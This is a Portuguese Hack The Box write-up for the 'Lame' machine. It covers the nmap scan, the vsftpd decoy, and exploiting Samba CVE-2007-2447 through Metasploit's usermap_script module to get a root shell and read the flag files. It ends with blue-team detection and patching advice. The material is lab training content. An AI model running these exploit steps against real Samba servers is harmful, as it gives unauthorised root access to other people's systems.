# Lame — Hack The Box

| | |
|---|---|
| **Máquina** | Lame |
| **SO** | Linux |
| **Dificuldade** | Easy |
| **Tópicos** | Samba `username map script` (CVE-2007-2447) → RCE como root |

---

## Resumo

Uma das máquinas mais antigas e clássicas do HTB. Foothold e root vêm da **mesma falha**: a versão antiga do Samba (3.0.20) é vulnerável ao **`username map script` (CVE-2007-2447)**, que permite injeção de comando no campo de usuário durante a autenticação — executando comando **direto como root**.

---

## 1. Reconhecimento

```bash
nmap -sC -sV -p- -oA nmap/lame 10.10.10.X
```

Portas relevantes:
- **21** — vsftpd 2.3.4 (login anônimo)
- **22** — OpenSSH 4.7
- **139 / 445** — Samba 3.0.20
- **3632** — distccd

> 📌 O **vsftpd 2.3.4** chama atenção (tem backdoor famosa), mas aqui é **beco sem saída** — a backdoor não dispara. Lição de oráculo: nem toda versão "vulnerável" tem o bug ativo. O caminho real é o **Samba**.

---

## 2. Exploração — CVE-2007-2447 (RCE como root)

O Samba usa um script para mapear nomes de usuário. Sem sanitização, metacaracteres de shell colocados no **username** da autenticação são executados pelo sistema **como root**.

Via Metasploit:
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.X
set LHOST <seu_ip>
run
```

Resultado: shell como **root** diretamente (sem etapa de user → root).

```bash
cat /home/makis/user.txt
cat /root/root.txt
```

---

## Lições aprendidas

- **Software EOL exposto** (Samba de 2007) = RCE trivial. Patch e inventário de versões são críticos.
- **Valide o oráculo:** o vsftpd "vulnerável" era isca. Confirmar antes de gastar tempo economiza horas.

### Perspectiva Blue Team / detecção

- Inventário e atualização de serviços expostos; alertar software em **end-of-life**.
- Monitorar autenticações SMB anômalas e execução de shell a partir do processo `smbd`.
- Segmentação de rede para serviços legados que não podem ser atualizados.
